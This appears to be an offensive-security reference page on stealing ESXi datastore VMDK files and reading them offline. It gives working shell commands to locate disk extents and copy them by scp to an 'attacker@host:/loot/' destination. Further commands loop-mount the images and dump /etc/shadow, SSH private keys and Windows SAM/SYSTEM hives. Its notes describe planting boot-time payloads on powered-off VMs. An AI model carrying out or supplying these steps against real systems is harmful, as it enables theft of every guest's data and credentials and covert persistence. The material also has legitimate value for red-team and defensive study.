---
title: "Datastore and VMDK theft: taking virtual disks and their data"
order: 2
description: "ESXi stores each VM's virtual disks as VMDK files on datastores (VMFS or NFS). With host or datastore access, an attacker copies the VMDK files and reads their filesystems offline, extracting every guest's data, credentials, and secrets without ever entering the running VMs, and can also tamper with disks or snapshots before a VM boots."
keywords:
  - vmdk
  - datastore
  - vmfs
  - virtual disk
  - offline access
---

# Datastore and VMDK theft

Every ESXi virtual machine's disks live as VMDK files on a datastore, either VMFS on local or SAN storage or a mounted NFS share. Access to the datastore, from a host shell, a management API, or the backing storage, lets an attacker copy those VMDK files and read their filesystems offline. This bypasses every in-guest control: there is no login, no EDR, no guest isolation, just the raw disk image, from which the attacker extracts the guest's files, password hashes, keys, and application secrets. The same access allows tampering, planting a payload on a powered-off VM's disk that runs when it next boots.

## Locate and copy disks

```bash
# on an ESXi host shell, datastores are under /vmfs/volumes
ls -la /vmfs/volumes/
find /vmfs/volumes -name '*.vmdk' | grep -v -- '-flat\|-delta'   # descriptors
# a VMDK is a small descriptor plus a large -flat (or -sparse/-delta) extent
cat /vmfs/volumes/<ds>/<vm>/<vm>.vmdk                            # descriptor names the extent
# copy the flat extent (the actual disk image) off the host
scp /vmfs/volumes/<ds>/<vm>/<vm>-flat.vmdk attacker@host:/loot/
```

## Read the disk offline

```bash
# mount the flat extent's filesystem read-only elsewhere (it is a raw disk image)
# find the partition offset, then loop-mount
fdisk -l <vm>-flat.vmdk
mount -o ro,loop,offset=$((2048*512)) <vm>-flat.vmdk /mnt/guest
# harvest from the guest filesystem
cat /mnt/guest/etc/shadow /mnt/guest/root/.ssh/id_* 2>/dev/null
reg="/mnt/guest/Windows/System32/config"; ls "$reg"/SAM "$reg"/SYSTEM 2>/dev/null
# tamper path: write a startup payload, then let the VM boot
```

For a Windows guest, the copied SAM and SYSTEM hives give offline hash extraction; for Linux, `/etc/shadow` and SSH keys. Snapshot delta files (`-delta.vmdk`, `-00000N.vmdk`) and the memory snapshot (`.vmsn`/`.vmem`) extend this to in-memory secrets at the time of the snapshot.

## Exploitation notes

- Copying the `-flat` (or sparse/delta) extent is the data theft; the small `.vmdk` descriptor only names the extent, so grab the extent for the actual contents.
- Offline mounting sidesteps all guest-side defenses; prioritise credential stores (SAM/SYSTEM, `/etc/shadow`, SSH and cloud keys) that unlock other systems.
- Memory snapshot files (`.vmem`) captured with a snapshot contain live secrets (keys, tokens, decrypted data) from when the snapshot was taken; carve them like a memory image.
- Datastore write access enables pre-boot tampering: plant a service, cron, or startup entry on a powered-off VM's disk for execution on next boot.

## Tools

- [libguestfs / guestmount (offline VM disk access)](https://libguestfs.org/)

## References

- [VMware: VMFS and virtual disk formats](https://docs.vmware.com/en/VMware-vSphere/index.html)
- [VMware VMDK format specification](https://www.vmware.com/app/vmdk/?src=vmdk)
